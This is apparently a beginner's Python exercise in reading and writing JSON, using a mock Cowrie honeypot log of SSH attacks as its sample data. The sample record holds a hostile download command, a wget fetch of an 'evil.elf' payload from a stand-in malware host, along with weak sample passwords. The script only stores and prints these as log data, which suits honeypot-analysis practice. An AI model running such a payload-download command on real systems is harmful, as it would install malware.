import json
import datetime

print("=" * 40)
print("JSON PRACTICE")
print("=" * 40)

# 1. CREATE a Python dictionary (like a real Cowrie log)
attack_log = {
    "timestamp": str(datetime.datetime.now()),
    "attacker_ip": "192.168.1.100",
    "username": "root",
    "password": "admin123",
    "command": "wget http://malware.com/evil.elf",
    "file_uploaded": "evil.elf",
    "file_size": 4096
}

# 2. CONVERT dictionary to JSON string
print("\n1. Converting to JSON...")
json_string = json.dumps(attack_log, indent=4)
print(json_string)

# 3. WRITE JSON to a file
print("\n2. Writing JSON to file...")
with open("attack_log.json", "w") as f:
    json.dump(attack_log, f, indent=4)
print("Written successfully!")

# 4. READ JSON from file
print("\n3. Reading JSON from file...")
with open("attack_log.json", "r") as f:
    loaded_log = json.load(f)

# 5. ACCESS specific fields
print("\n4. Accessing specific fields...")
print(f"Attacker IP: {loaded_log['attacker_ip']}")
print(f"Command used: {loaded_log['command']}")
print(f"File uploaded: {loaded_log['file_uploaded']}")

# 6. MULTIPLE attacks as a list
print("\n5. Multiple attacks...")
attacks = [
    {"ip": "10.0.0.1", "password": "123456", "success": False},
    {"ip": "10.0.0.2", "password": "admin", "success": False},
    {"ip": "10.0.0.3", "password": "root123", "success": True},
]

for attack in attacks:
    if attack["success"]:
        print(f"  ⚠️  SUCCESSFUL login from {attack['ip']}")
    else:
        print(f"  ❌ Failed login from {attack['ip']}")

import os
os.remove("attack_log.json")
print("\n=" * 40)
print("JSON practice complete!")
